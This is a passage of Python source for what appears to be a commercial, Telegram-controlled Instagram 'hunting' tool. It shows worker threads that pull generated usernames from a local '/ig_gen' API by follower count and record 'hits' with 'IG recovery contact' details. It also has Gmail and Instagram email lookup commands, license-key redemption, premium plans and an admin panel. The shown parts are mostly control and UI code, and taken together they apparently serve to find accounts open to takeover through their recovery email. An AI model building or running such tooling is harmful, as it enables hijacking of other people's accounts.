

def set_timeout(value):
    global TIMEOUT
    TIMEOUT = max(1, int(value))
    log_event("CONFIG", f"Timeout set to {TIMEOUT}s")


_HUNT_SOFT_BLOCK_HINTS = frozenset({
    "ig cooldown",
    "buffer empty",
    "gen idle",
    "endpoint backlog",
    "slow drain",
})


def _is_soft_hunt_block(block):
    if not block:
        return False
    low = str(block).lower()
    return any(hint in low for hint in _HUNT_SOFT_BLOCK_HINTS)


def hunt_block_reason():
    """Why workers are not generating (None = hunt should be active)."""
    if not _workers_started:
        return "workers not started"
    if is_locally_logged_out():
        return "logged out"
    uid = resolve_operator_telegram_id()
    if TELEGRAM_ENABLED and uid and operator_ban_active(uid, force=False):
        return "suspended — contact admin"
    if _api_auto_paused:
        return "API offline — run endpoint.py"
    if _user_manual_paused:
        return "paused (manual)"
    if not get_api_alive() and not _hunt_recently_ok():
        if _local_gateway_mode() and pause_event.is_set():
            return None
        return "API unreachable"
    if TELEGRAM_ENABLED and not hunting_license_ok():
        _, plan_reason, _ = plan_can_hunt()
        if plan_reason == "daily_limit":
            return f"free daily limit ({FREE_DAILY_GEN_LIMIT:,}) — /redeem Premium"
        if plan_reason == "trial_expired":
            return f"free trial ended — /redeem Premium"
        return "plan inactive — /plan"
    # Avoid flicker: rely on access sync loop's gate state rather than doing a fresh check here.
    if TELEGRAM_ENABLED and ACCESS_BLOCKED:
        return "access gate — finish Telegram setup"
    if not pause_event.is_set():
        return "workers on standby"
    idle = time.monotonic() - _last_gen_at
    if idle > 25 and get_api_alive():
        meta = _hunt_gateway_meta
        ig_block = float(meta.get("ig_block") or 0.0)
        if ig_block > 1.0 and not _hunt_gen_recently_active(20):
            return f"IG cooldown {ig_block:.0f}s"
        buf = meta.get("buffer")
        if buf is not None and buf <= 0 and not _hunt_gen_recently_active(20):
            return "buffer empty — refilling"
        if idle > 90 and not _hunt_gen_recently_active(30):
            return f"gen idle {idle:.0f}s"
    return None


def _spawn_hunt_worker():
    global _next_worker_id
    with _worker_id_lock:
        worker_id = _next_worker_id
        _next_worker_id += 1
    t = threading.Thread(
        target=worker,
        args=(worker_id,),
        name=f"hunt-worker-{worker_id}",
        daemon=True,
    )
    t.start()
    worker_threads.append(t)


def _note_gen_success():
    global _last_gen_at
    _last_gen_at = time.monotonic()


def _hunt_pulse_loop():
    global _pulse_last_gen, _pulse_last_at
    while True:
        time.sleep(45)
        if not _workers_started or is_locally_logged_out():
            continue
        with lock:
            current_gen = gen
            current_valid = valid
            current_hit = hit
        delta = current_gen - _pulse_last_gen
        elapsed = max(0.1, time.monotonic() - _pulse_last_at)
        if delta <= 0:
            idle = time.monotonic() - _last_gen_at
            block = _hunt_block_reason_live() if JACK_PANEL_LIVE else hunt_block_reason()
            if block and not _is_soft_hunt_block(block):
                log_event("PULSE", f"blocked — {block}")
            elif block:
                log_event("PULSE", f"throttled — {block}")
            elif idle > 20:
                meta = _hunt_gateway_meta
                log_event(
                    "PULSE",
                    f"gen idle {idle:.0f}s · buf {meta.get('buffer', '?')} · "
                    f"IG {float(meta.get('ig_block') or 0):.0f}s · "
                    f"pause={'Y' if pause_event.is_set() else 'N'}",
                )
        else:
            rate = delta / elapsed * 60.0
            log_event(
                "PULSE",
                f"+{delta} gen ({rate:.0f}/min) · total {current_gen:,} · "
                f"valid {current_valid} · hits {current_hit}",
            )
        _drain_hit_deep_idle_queue()
        _pulse_last_gen = current_gen
        _pulse_last_at = time.monotonic()


def _start_hunt_pulse_thread():
    global _hunt_pulse_started
    if _hunt_pulse_started:
        return
    _hunt_pulse_started = True
    threading.Thread(
        target=_hunt_pulse_loop, daemon=True, name="hunt-pulse",
    ).start()


def start_hunt_workers():
    """Start background hunt threads once (safe to call multiple times)."""
    global _workers_started
    if _workers_started:
        apply_worker_pause_state()
        return
    apply_worker_pause_state()
    _init_session_hits_file()
    for _ in range(THREAD_COUNT):
        _spawn_hunt_worker()
    _workers_started = True
    _warmup_probes_once()
    apply_worker_pause_state()
    _start_hunt_pulse_thread()
    block = hunt_block_reason()
    if block:
        log_event("CONFIG", f"Workers online ({THREAD_COUNT}) — blocked: {block}")
    else:
        log_event("CONFIG", f"Hunt workers online ({THREAD_COUNT} threads · full cycle)")
    log_event(
        "CONFIG",
        f"Hunt net-blip: {HUNT_BLIP_PAUSE_SEC:.1f}s pause after {HUNT_BLIP_TRIGGER} fails",
    )
    mode = "hunt_cycle (1 HTTP)" if HUNT_USE_CYCLE else "legacy buffered /ig_gen"
    log_event(
        "CONFIG",
        f"Hunt profile: {HUNT_PROFILE} · IG {HUNT_IG_LOOKUP_ROUTE} · {mode} · slots {HUNT_GATEWAY_CONCURRENCY} · {THREAD_COUNT} workers",
    )
    if _IS_TERMUX:
        log_event(
            "CONFIG",
            f"Termux tune: {THREAD_COUNT}w · {HUNT_GATEWAY_CONCURRENCY} gateway slots · "
            f"ig_gen read {HUNT_IG_GEN_READ_TIMEOUT}s · export JACK_THREADS=64 before endpoint.py",
        )
    else:
        log_event(
            "CONFIG",
            f"Desktop hunt: {THREAD_COUNT} workers · {HUNT_GATEWAY_CONCURRENCY} gateway slots · "
            f"cycle timeout {HUNT_CYCLE_TIMEOUT}s",
        )
    log_event("CONFIG", "Hit alerts: real IG recovery contact only (no fake email)")
    if TELEGRAM_ENABLED and not ACCESS_BLOCKED:
        mark_operator_access_verified()


def set_thread_count(value):
    global THREAD_COUNT
    target = max(1, int(value))
    THREAD_COUNT = target
    slots = _hunt_gateway_slots_for_threads(target)
    _resize_hunt_gateway_sem(slots)
    if not _workers_started:
        log_event(
            "CONFIG",
            f"Worker target {target} · gateway slots {slots} (restart endpoint.py if slots changed)",
        )
        return
    current_threads = len(worker_threads)
    if target > current_threads:
        for _ in range(target - current_threads):
            _spawn_hunt_worker()
        log_event("CONFIG", f"Expanded worker threads to {target} · gateway slots {slots}")
    else:
        log_event("CONFIG", f"Worker target {target} · gateway slots {slots} (active: {current_threads})")


def bump_min_followers(delta):
    set_min_followers(MIN_FOLLOWERS + delta)


def bump_thread_count(delta):
    set_thread_count(THREAD_COUNT + delta)


def set_live_watch(active, chat_id=None, message_id=None):
    global LIVE_WATCH
    LIVE_WATCH = active
    if active and chat_id and message_id:
        LIVE_PANEL["chat_id"] = str(chat_id)
        LIVE_PANEL["message_id"] = message_id
        LIVE_PANEL["view"] = "stats"
        log_event("CONFIG", "Live dashboard refresh enabled")
    else:
        LIVE_PANEL["chat_id"] = None
        LIVE_PANEL["message_id"] = None
        LIVE_PANEL["view"] = None
        if not active:
            log_event("CONFIG", "Live dashboard refresh disabled")


def update_live_panel_tracking(callback, callback_data):
    """Keep live auto-edit on dashboard only; pause when other panels are open."""
    if not LIVE_WATCH:
        return
    chat_id, message_id, _ = panel_message_from_callback(callback)
    if chat_id and message_id:
        LIVE_PANEL["chat_id"] = str(chat_id)
        LIVE_PANEL["message_id"] = message_id
    if callback_data in LIVE_DASHBOARD_CALLBACKS:
        LIVE_PANEL["view"] = "stats"
    elif callback_data != "LIVE_OFF":
        LIVE_PANEL["view"] = None


def reset_session_stats():
    profile_archive_session()
    global gen, valid, hit, errors, START_TIME, last_milestone_hit
    global _last_gen_at, _pulse_last_gen, _pulse_last_at
    with lock:
        gen = 0
        valid = 0
        hit = 0
        errors = 0
    with event_log_lock:
        event_log.clear()
    clear_session_hit_timestamps()
    START_TIME = datetime.now(timezone.utc)
    _init_session_hits_file()
    _last_gen_at = time.monotonic()
    _pulse_last_gen = 0
    _pulse_last_at = time.monotonic()
    with profile_lock:
        profile = load_profile_data()
        last_milestone_hit = max(
            int(profile.get("last_milestone_hit") or 0),
            int(load_profile_cache(profile.get("operator_id")).get("last_milestone_hit") or 0),
        )
    log_event("CONFIG", "Session stats reset remotely")


def check_backend_health():
    url = f"http://{ip}:{port}/ig_gen?min={MIN_FOLLOWERS}"
    started = time.time()
    try:
        response = session.get(url, timeout=min(10, TIMEOUT))
        latency_ms = int((time.time() - started) * 1000)
        if response.ok:
            data = response.json()
            if data.get("username") or "info" in data:
                return True, "ig_gen OK", latency_ms
            return True, "ig_gen responded", latency_ms
        return False, f"HTTP {response.status_code}", latency_ms
    except Exception as exc:
        latency_ms = int((time.time() - started) * 1000)
        return False, str(exc)[:80], latency_ms


def export_hits_archive():
    session_path = _current_session_hits_path()
    if session_path:
        caption = (
            format_panel_header()
            + f"<b>{S['btn_export']} Session hits export</b>\n"
            + tg_row("File", os.path.basename(session_path))
        )
        return send_telegram_document(session_path, caption=caption)
    if not os.path.exists("hits.txt"):
        return bot_command_reply(
            format_action_notice("Export failed", "No hits saved yet this session.", "WARN"),
            reply_markup=panel_keyboard("tools"),
        )
    caption = format_panel_header() + f"<b>{S['btn_export']} Hit archive export</b>"
    return send_telegram_document("hits.txt", caption=caption)


def maybe_send_milestone_alert():
    """Lifetime hit milestones — persisted so they do not repeat every session."""
    global last_milestone_hit
    if not TELEGRAM_ENABLED:
        return
    milestone = None
    with profile_lock:
        profile = load_profile_data()
        lifetime_hits = int(profile.get("lifetime", {}).get("total_hits") or 0)
        marker = max(
            int(last_milestone_hit or 0),
            int(profile.get("last_milestone_hit") or 0),
            int(load_profile_cache(profile.get("operator_id")).get("last_milestone_hit") or 0),
        )
        passed = [m for m in HIT_MILESTONES if marker < m <= lifetime_hits]
        if not passed:
            return
        milestone = passed[-1]
        if int(profile.get("last_milestone_hit") or 0) >= milestone:
            return
        last_milestone_hit = milestone
        profile["last_milestone_hit"] = milestone
        save_profile_data(profile)
    send_telegram_text(
        format_panel_header()
        + f"<b>{S['brand']} Milestone</b>\n\n"
        + tg_row("Lifetime hits", str(milestone))
        + f"\n<b>State</b>  {tg_state_badge()}",
    )


def live_watch_loop():
    while True:
        time.sleep(LIVE_WATCH_INTERVAL)
        if not TELEGRAM_ENABLED or not LIVE_WATCH:
            continue
        if LIVE_PANEL.get("view") != "stats":
            continue
        chat_id = LIVE_PANEL.get("chat_id")
        message_id = LIVE_PANEL.get("message_id")
        if not chat_id or not message_id:
            continue
        try:
            update_panel_message(
                chat_id,
                message_id,
                format_stats(),
                panel_keyboard("main"),
            )
        except Exception as exc:
            log_event("TG LIVE", str(exc))


def load_startup_photo_bytes(*, force_refresh=False):
    url = (STARTUP_PHOTO_URL or "").strip()
    if not url:
        return None, None
    now = time.time()
    if not force_refresh:
        cached = _startup_photo_cache
        if cached.get("bytes") and (now - cached.get("at", 0)) < STARTUP_PHOTO_CACHE_TTL:
            return cached["bytes"], cached.get("ctype") or "image/jpeg"
    photo, ctype = _fetch_url_with_retries(
        url,
        timeout=STARTUP_PHOTO_TIMEOUT,
        retries=STARTUP_PHOTO_RETRIES,
        delay=STARTUP_PHOTO_RETRY_DELAY,
        label="STARTUP IMG",
    )
    if photo:
        _startup_photo_cache["bytes"] = photo
        _startup_photo_cache["ctype"] = ctype
        _startup_photo_cache["at"] = now
    return photo, ctype


def preload_startup_photo_async():
    def _run():
        try:
            load_startup_photo_bytes(force_refresh=True)
        except Exception:
            pass

    threading.Thread(target=_run, daemon=True, name="startup-img").start()


def _send_startup_photo_message(caption, kb, photo, content_type):
    data = {
        "chat_id": operator_reply_chat_id(),
        "caption": caption,
        "parse_mode": "HTML",
        "reply_markup": json.dumps(kb),
    }
    data = telegram_disable_link_preview(data, "sendPhoto")
    files = {"photo": ("inpareto_welcome.png", photo, content_type or "image/jpeg")}
    return telegram_post_with_retries(
        "sendPhoto",
        data=data,
        files=files,
        timeout=TG_SEND_TIMEOUT,
        max_retries=STARTUP_PHOTO_SEND_RETRIES,
        label="STARTUP",
    )


def _discard_startup_loading_message(chat_id, message_id):
    if chat_id and message_id:
        delete_telegram_message(chat_id, message_id)


def send_startup_panel(*, prefer_edit=False, discard_loading=None):
    """Welcome panel with INPARETO image + caption (startup + /start)."""
    if not TELEGRAM_ENABLED:
        return None
    loading_chat_id, loading_message_id = (None, None)
    if discard_loading:
        loading_chat_id, loading_message_id = discard_loading
    elif not prefer_edit:
        taken = _take_startup_loading_discard(
            operator_reply_chat_id() or TELEGRAM_CHAT_ID
        )
        if taken:
            loading_chat_id, loading_message_id = taken
    caption = format_startup()
    kb = panel_keyboard("main")
    reply_cid = operator_reply_chat_id()

    photo, content_type = load_startup_photo_bytes()
    if not photo:
        resp = send_telegram_text(caption, reply_markup=kb, chat_id=reply_cid)
        remember_startup_panel(response=resp, has_photo=False)
        _sync_live_panel_from_reply_markup(kb)
        if _telegram_api_ok(resp):
            _discard_startup_loading_message(loading_chat_id, loading_message_id)

        def _photo_upgrade():
            try:
                p, ct = load_startup_photo_bytes(force_refresh=True)
                if not p:
                    return
                r = _send_startup_photo_message(caption, kb, p, ct)
                if r is not None:
                    remember_startup_panel(response=r, has_photo=True)
            except Exception as exc:
                log_event("STARTUP", str(exc)[:80])

        threading.Thread(target=_photo_upgrade, daemon=True, name="startup-img").start()
        return resp

    if photo:
        chat_id = STARTUP_PANEL.get("chat_id") or reply_cid
        message_id = STARTUP_PANEL.get("message_id")
        has_photo = STARTUP_PANEL.get("has_photo")
        if prefer_edit and has_photo and chat_id and message_id:
            resp = edit_telegram_caption(chat_id, message_id, caption, reply_markup=kb)
            if _telegram_api_ok(resp):
                remember_startup_panel(chat_id, message_id, has_photo=True)
                _sync_live_panel_from_reply_markup(kb)
                _discard_startup_loading_message(loading_chat_id, loading_message_id)
                return resp

        if message_id and chat_id and not has_photo:
            delete_telegram_message(chat_id, message_id)

        resp = _send_startup_photo_message(caption, kb, photo, content_type)
        if resp is None:
            photo, content_type = load_startup_photo_bytes(force_refresh=True)
            if photo:
                resp = _send_startup_photo_message(caption, kb, photo, content_type)
        if resp is not None:
            remember_startup_panel(response=resp, has_photo=True)
            _sync_live_panel_from_reply_markup(kb)
            if _telegram_api_ok(resp):
                _discard_startup_loading_message(loading_chat_id, loading_message_id)
            return resp

    if prefer_edit:
        chat_id = STARTUP_PANEL.get("chat_id") or reply_cid
        message_id = STARTUP_PANEL.get("message_id")
        if chat_id and message_id and STARTUP_PANEL.get("has_photo"):
            resp = edit_telegram_caption(chat_id, message_id, caption, reply_markup=kb)
            if _telegram_api_ok(resp):
                remember_startup_panel(chat_id, message_id, has_photo=True)
                _sync_live_panel_from_reply_markup(kb)
                if loading_message_id:
                    _discard_startup_loading_message(loading_chat_id, loading_message_id)
                return resp
        if chat_id and message_id:
            resp = edit_telegram_message(chat_id, message_id, caption, reply_markup=kb)
            if _telegram_api_ok(resp):
                remember_startup_panel(chat_id, message_id, has_photo=False)
                _sync_live_panel_from_reply_markup(kb)
                if loading_message_id:
                    _discard_startup_loading_message(loading_chat_id, loading_message_id)
                return resp
    resp = send_telegram_text(caption, reply_markup=kb, chat_id=reply_cid)
    remember_startup_panel(response=resp, has_photo=False)
    _sync_live_panel_from_reply_markup(kb)
    if _telegram_api_ok(resp):
        _discard_startup_loading_message(loading_chat_id, loading_message_id)
    return resp


def send_startup_message():
    if not TELEGRAM_ENABLED:
        return
    if reply_hit_group_required() is not None:
        return
    send_startup_panel(prefer_edit=False)


def answer_callback(callback_query_id, text, show_alert=False):
    return send_telegram_request("answerCallbackQuery", data={
        "callback_query_id": callback_query_id,
        "text": text,
        "show_alert": show_alert,
    })


def parse_number(value, default=None, minimum=1):
    try:
        parsed = int(value)
        return max(minimum, parsed)
    except Exception:
        return default


ADMIN_CMD_HEADS = frozenset({
    "/admin", "/adminhelp", "/set", "/addadmin", "/get", "/botdefaults",
    "/rebrand", "/rebrandall", "/force", "/forcelist", "/forcedel", "/ban",
    "/unban", "/broadcast", "/users", "/adminstats",
    "/licensegen", "/genkey", "/grant", "/revoke", "/licenseinfo",
    "/licenses", "/licensekeys",
    *ADMIN_SET_LEGACY.keys(),
})

# Welcome + hunt dashboard — need hit group, not license alone.
PANEL_COMMAND_HEADS = frozenset({
    "/start", "start", "/stats", "stats", "/status", "status",
    "/api", "api", "/cloud", "cloud", "/settings", "settings",
    "/hits", "hits", "/saved", "saved", "/profile", "profile",
    "/leaderboard", "leaderboard", "/badges", "badges",
    "/analytics", "analytics", "/health", "health",
    "/export", "export", "/live", "live", "/reset", "reset",
    "/pause", "pause", "/resume", "resume",
})


def is_operator_tuning_command(lower):
    return (
        lower.startswith("/set min")
        or lower.startswith("/set timeout")
        or lower.startswith("/set threads")
        or lower.startswith("/setthreads")
    )


def _is_check_command(command):
    cmd = normalize_bot_command_text(command or "")
    head = _telegram_command_head(cmd)
    lower = cmd.strip().lower()
    return head == "/check" or lower in {"/check", "check"} or lower.startswith("/check ")


def cmd_operator_check(command, actor):
    """Full health diagnostic — always available (even when hunt is locked)."""
    parts = normalize_bot_command_text(command or "").strip().split()
    target = str(actor or "").strip()
    remote = False
    if len(parts) > 1:
        if not admin_is_admin(actor):
            return bot_command_reply(
                format_action_notice(
                    "Check",
                    "Usage: <code>/check</code> — diagnoses this device.\n"
                    "<i>Only admins can run</i> <code>/check USER_ID</code> for remote account checks.",
                    "INFO",
                    detail_html=True,
                ),
            )
        target = parts[1].strip().lstrip("@")
        machine_uid = str(resolve_operator_telegram_id() or "")
        remote = bool(target and target != machine_uid)
    snap = collect_operator_health_checks(target, remote=remote)
    body = format_operator_check_message(target, remote=remote)
    return bot_command_reply(body, reply_markup=operator_check_reply_keyboard(snap))


def process_bot_command(command, from_user_id=None):
    command = normalize_bot_command_text(command or "")
    actor = str(from_user_id or resolve_operator_id(TELEGRAM_CHAT_ID) or "")
    lower = command.strip().lower()
    head = _telegram_command_head(command)

    if _is_check_command(command):
        return cmd_operator_check(command, actor)

    if (
        actor
        and admin_is_admin(actor)
        and not is_operator_tuning_command(lower)
        and (head in ADMIN_CMD_HEADS or head.startswith("/admin"))
    ):
        reply = admin_process_command(command.strip(), actor)
        if reply:
            body = reply if "<b>" in reply else format_action_notice("Admin", reply, "OK")
            return bot_command_reply(body)

    if lower.startswith("/redeem"):
        parts = command.strip().split(maxsplit=1)
        if len(parts) < 2:
            return bot_command_reply(
                format_action_notice(
                    "Redeem",
                    "Usage: <code>/redeem INPA-XXXX-XXXX-XXXX-XXXX</code>",
                    "WARN",
                    detail_html=True,
                ),
            )
        ok, result = license_redeem_key(parts[1], actor)
        if ok:
            clear_local_free_plan()
            sync_operator_access()
            return bot_command_reply(
                format_action_notice(
                    "INPARETO Premium activated",
                    f"Unlimited hunt access until <b>{license_format_expiry(result)}</b>.\n"
                    "Daily generation cap removed · complete channel joins + hit group if prompted.",
                    "OK",
                    detail_html=True,
                ),
                reply_markup=panel_keyboard("notice"),
            )
        detail = result if isinstance(result, str) else "Redeem failed"
        return bot_command_reply(
            format_action_notice("Redeem failed", detail, "ERR", detail_html=True),
        )

    if lower in {"/mylicense", "mylicense", "/license", "license"}:
        return bot_command_reply(format_my_license_message(actor))

    if lower in {"/plan", "plan"}:
        return bot_command_reply(format_plan_message(actor))

    if lower in {"/verify", "verify"}:
        admin_invalidate_access(actor)
        invalidate_operator_gate_cache()
        granted, state = admin_user_access_granted(actor)
        if granted:
            hg_ok, hg_reason = operator_hit_group_access_state(force=True)
            sync_operator_access()
            apply_worker_pause_state()
            if hg_ok and not paused:
                pause_event.set()
            if hg_ok:
                mark_operator_access_verified()
                return bot_command_reply(
                    format_action_notice(
                        "Access verified",
                        "Joins and hit group OK — hunting and remote control unlocked.",
                        "OK",
                    ),
                    reply_markup=panel_keyboard("notice"),
                )
            return send_access_gate_reply()
        if state == "banned":
            return send_access_gate_reply()
        if state in ("no_license", "expired", "cloud_offline", "trial_expired", "daily_limit"):
            entitled, preason, pinfo = operator_plan_entitled(actor)
            if entitled:
                pass
            else:
                return bot_command_reply(format_operator_plan_gate(preason or state, pinfo))
        missing = state if isinstance(state, list) else []
        detail = str(state) if isinstance(state, str) else "Complete all joins first."
        if missing:
            detail = "\n".join(
                f"· {r.get('preview_name')}: {r.get('_verify_hint', 'not joined')}"
                for r in missing[:6]
            )
        return bot_command_reply(
            format_action_notice("Still locked", detail, "WARN"),
            reply_markup=admin_join_gate_keyboard(missing) if missing else hit_group_gate_keyboard(),
        )

    if lower in {"/logout", "logout"}:
        return bot_command_reply(
            format_logout_confirm(),
            reply_markup=panel_keyboard("logout_confirm"),
        )

    if lower in {"/hitgroup", "hitgroup", "/setgroup", "setgroup"} or head in {"/hitgroup", "/setgroup"}:
        return bot_command_reply(
            format_hit_group_setup_message(),
            reply_markup=hit_group_gate_keyboard(),
        )
    if lower in {"/verifyhitgroup", "verifyhitgroup"} or head == "/verifyhitgroup":
        reply_cid = operator_reply_chat_id()
        in_group = bool(operator_command_in_group() and reply_cid)
        ok, msg = verify_operator_hit_group_access(
            fast=True,
            group_id=reply_cid if in_group else None,
        )
        if ok:
            return bot_command_reply(
                format_action_notice("Hit group verified", msg, "OK"),
                reply_markup=panel_keyboard("notice"),
            )
        body = msg if isinstance(msg, str) and "<b>" in msg else format_hit_group_gate_message("no_hit_group")
        return bot_command_reply(body, reply_markup=hit_group_gate_keyboard())

    if lower in {"/start", "start"}:
        schedule_sync_telegram_commands(actor or TELEGRAM_CHAT_ID)
        refresh_terminal_license_from_cloud()
        return send_startup_panel(prefer_edit=False)

    if lower in {"/help", "help"}:
        return bot_command_reply(format_help(), reply_markup=panel_keyboard("help"))

    if TELEGRAM_ENABLED and not operator_bot_commands_allowed(actor):
        gate = send_access_gate_reply()
        if gate is not True:
            return gate

    if TELEGRAM_ENABLED and head in PANEL_COMMAND_HEADS:
        hg_block = reply_hit_group_required(actor)
        if hg_block is not None:
            return hg_block

    if lower in {"/stats", "stats"}:
        return bot_command_reply(format_stats(), reply_markup=panel_keyboard("main"))
    if lower in {"/status", "status"}:
        return bot_command_reply(format_status_quick(), reply_markup=panel_keyboard("status"))
    if lower in {"/api", "api"}:
        return bot_command_reply(format_api_quick(), reply_markup=panel_keyboard("api"))
    if lower in {"/cloud", "cloud"}:
        return bot_command_reply(format_cloud_quick(), reply_markup=panel_keyboard("cloud"))
    if lower in {"/settings", "settings"}:
        return bot_command_reply(
            format_settings(),
            reply_markup=panel_keyboard("settings"),
        )
    if lower.startswith("/set min"):
        parts = command.split()
        if len(parts) < 3:
            return bot_command_reply(
                format_action_notice(
                    "Usage", f"/set min {tg_code('number')}", "INFO", detail_html=True,
                ),
                reply_markup=panel_keyboard("settings"),
            )
        value = parse_number(parts[2])
        if value is None:
            return bot_command_reply(
                format_action_notice("Invalid value", "Min followers must be a positive number.", "WARN"),
                reply_markup=panel_keyboard("settings"),
            )
        set_min_followers(value)
        if MIN_FOLLOWERS_FILTER_ENABLED:
            detail = f"Now hunting accounts with ≥ {value} followers."
        else:
            detail = (
                f"Saved min target {value}. Follower filter is off — "
                "IG gen API no longer returns follower counts."
            )
        return bot_command_reply(
            format_action_notice("Min target updated", detail),
            reply_markup=panel_keyboard("settings"),
        )
    if lower.startswith("/set timeout"):
        parts = command.split()
        if len(parts) < 3:
            return bot_command_reply(
                format_action_notice(
                    "Usage", f"/set timeout {tg_code('seconds')}", "INFO", detail_html=True,
                ),
                reply_markup=panel_keyboard("settings"),
            )
        value = parse_number(parts[2], minimum=1)
        if value is None:
            return bot_command_reply(
                format_action_notice("Invalid value", "Timeout must be a positive number of seconds.", "WARN"),
                reply_markup=panel_keyboard("settings"),
            )
        set_timeout(value)
        return bot_command_reply(
            format_action_notice("Timeout updated", f"Request timeout is now {value}s."),
            reply_markup=panel_keyboard("settings"),
        )
    if lower.startswith("/set threads") or lower.startswith("/setthreads"):
        parts = command.split()
        if len(parts) < 3:
            return bot_command_reply(
                format_action_notice(
                    "Usage", f"/set threads {tg_code('count')}", "INFO", detail_html=True,
                ),
                reply_markup=panel_keyboard("settings"),
            )
        value = parse_number(parts[2], minimum=1)
        if value is None:
            return bot_command_reply(
                format_action_notice("Invalid value", "Thread count must be a positive integer.", "WARN"),
                reply_markup=panel_keyboard("settings"),
            )
        set_thread_count(value)
        return bot_command_reply(
            format_action_notice("Workers updated", f"Thread pool target set to {value}."),
            reply_markup=panel_keyboard("settings"),
        )
    if lower in {"/pause", "pause"}:
        set_paused(True)
        return bot_command_reply(
            format_pause_resume_confirm(False),
            reply_markup=panel_keyboard("pause_notice"),
        )
    if lower in {"/resume", "resume"}:
        set_paused(False)
        return bot_command_reply(
            format_pause_resume_confirm(True),
            reply_markup=panel_keyboard("pause_notice"),
        )
    if lower in {"/hits", "hits"}:
        return bot_command_reply(format_hits_message(), reply_markup=panel_keyboard("hits"))
    if lower in {"/saved", "saved"}:
        return export_saved_favorites()
    if lower in {"/profile", "profile"}:
        return bot_command_reply(
            format_profile(), reply_markup=panel_keyboard("profile"),
        )
    if lower in {"/leaderboard", "leaderboard"}:
        return bot_command_reply(
            format_operator_leaderboard(), reply_markup=panel_keyboard("leaderboard"),
        )
    if lower in {"/badges", "badges"}:
        return bot_command_reply(
            format_badges(), reply_markup=panel_keyboard("profile"),
        )
    if lower in {"/analytics", "analytics"}:
        return bot_command_reply(format_analytics(), reply_markup=panel_keyboard("analytics"))
    if lower in {"/health", "health"}:
        return bot_command_reply(format_health(), reply_markup=panel_keyboard("health"))
    if lower in {"/export", "export"}:
        return export_hits_archive()
    if lower.startswith("/live"):
        parts = lower.split()
        if len(parts) < 2 or parts[1] not in {"on", "off"}:
            return bot_command_reply(
                format_action_notice("Usage", "/live on  or  /live off", "INFO"),
                reply_markup=panel_keyboard("tools"),
            )
        set_live_watch(parts[1] == "on")
        state = "enabled" if LIVE_WATCH else "disabled"
        return bot_command_reply(
            format_action_notice("Live refresh", f"Auto dashboard {state}. Pin a panel & use Tools → Live for best results."),
            reply_markup=panel_keyboard("tools"),
        )
    if lower in {"/reset", "reset"}:
        return bot_command_reply(
            format_reset_confirm(),
            reply_markup=panel_keyboard("reset_confirm"),
        )
    if lower.startswith("/lookup"):
        parts = command.strip().split(None, 2)
        if len(parts) < 3:
            return bot_command_reply(
                format_action_notice(
                    "Usage",
                    "/lookup gmail user@gmail.com\n/lookup insta user@gmail.com",
                    "INFO",
                ),
                remove_markup=True,
            )
        kind = parts[1].lower()
        email = normalize_lookup_email(parts[2])
        if not email:
            return bot_command_reply(
                format_action_notice("Invalid email", "Use a full email address.", "WARN"),
                remove_markup=True,
            )
        if kind in {"gmail", "g"}:
            body = cmd_lookup_gmail(email)
        elif kind in {"insta", "ig", "instagram"}:
            body = cmd_lookup_insta(email)
        else:
            return bot_command_reply(
                format_action_notice(
                    "Unknown lookup",
                    f"Use {tg_code('gmail')} or {tg_code('insta')}.",
                    "WARN",
                ),
                remove_markup=True,
            )
        return bot_command_reply(body, remove_markup=True)
    if lower.startswith("/gen"):
        parts = command.strip().split()
        if len(parts) < 3:
            return bot_command_reply(
                format_action_notice(
                    "Usage",
                    f"/gen COUNT MIN_FOLLOWERS (max {GEN_CMD_MAX_COUNT} · min ≤{GEN_CMD_MAX_MIN})",
                    "INFO",
                ),
                remove_markup=True,
            )
        count = parse_number(parts[1], minimum=1)
        min_val = parse_number(parts[2], minimum=1)
        if count is None or min_val is None:
            return bot_command_reply(
                format_action_notice("Invalid values", "COUNT and MIN must be positive numbers.", "WARN"),
                remove_markup=True,
            )
        if count > GEN_CMD_MAX_COUNT:
            return bot_command_reply(
                format_action_notice(
                    "Limit",
                    f"Max {GEN_CMD_MAX_COUNT} usernames per /gen command.",
                    "WARN",
                ),
                remove_markup=True,
            )
        if min_val > GEN_CMD_MAX_MIN:
            return bot_command_reply(
                format_action_notice(
                    "Limit",
                    f"Max minimum followers is {GEN_CMD_MAX_MIN}.",
                    "WARN",
                ),
                remove_markup=True,
            )
        return bot_command_reply(cmd_generate_batch(count, min_val), remove_markup=True)
    return bot_command_reply(
        format_action_notice("Unknown command", "Send /stats for the dashboard or /help for commands.", "ERR"),
        reply_markup=panel_keyboard("notice"),
    )


def handle_telegram_update(update):
    global LEADERBOARD_MODE
    if "my_chat_member" in update:
        threading.Thread(
            target=handle_operator_my_chat_member,
            args=(update,),
            daemon=True,
            name="tg-mcm",
        ).start()
        return
    actor = telegram_actor_id(update)
    if "callback_query" in update:
        callback = update["callback_query"]
        cb_msg = callback.get("message") or {}
        cb_chat = cb_msg.get("chat") or {}
        cb_chat_id = str(cb_chat.get("id", ""))
        cb_chat_type = cb_chat.get("type", "private")
        if not can_control_operator_bot(actor):
            if cb_chat_type in ("group", "supergroup"):
                answer_callback(
                    callback.get("id"),
                    "Only the linked operator or admin can use this bot.",
                    show_alert=True,
                )
            return
        if cb_chat_type == "private" and str(actor) != str(cb_chat_id):
            return
        callback_data = callback.get("data", "")
        if callback_data in ("REFRESH", "HOME"):
            callback_data = "STATS"
        main_kb = panel_keyboard("main")
        update_live_panel_tracking(callback, callback_data)

        if callback_data == "VERIFY_HITGROUP":
            answer_callback(callback.get("id"), "Verifying hit group…", show_alert=False)

        if callback_data == "VERIFY_JOIN":
            answer_callback(callback.get("id"), "Checking access…", show_alert=False)
            paid_ok, paid_reason, paid_exp = paid_access_status(actor)
            entitled, plan_reason, plan_info = operator_plan_entitled(actor)
            if not entitled and not admin_is_admin(actor):
                edit_panel_from_callback(
                    callback,
                    format_operator_plan_gate(plan_reason or paid_reason or "no_license", plan_info, paid_exp),
                    main_kb,
                    toast="Plan required",
                    show_alert=True,
                )
                return
            if not plan_can_hunt(actor)[0] and not admin_is_admin(actor):
                _, hunt_reason, hunt_info = plan_can_hunt(actor)
                if hunt_reason == "daily_limit":
                    edit_panel_from_callback(
                        callback,
                        format_operator_plan_gate("daily_limit", hunt_info),
                        main_kb,
                        toast="Daily limit reached",
                        show_alert=True,
                    )
                    return
            admin_invalidate_access(actor)
            invalidate_operator_gate_cache()
            granted, state = admin_user_access_granted(actor)
            if granted:
                hg_ok, _ = operator_hit_group_access_state(force=True)
                sync_operator_access()
                apply_worker_pause_state()
                if hg_ok and not paused:
                    pause_event.set()
                if hg_ok:
                    mark_operator_access_verified()
                    detail = (
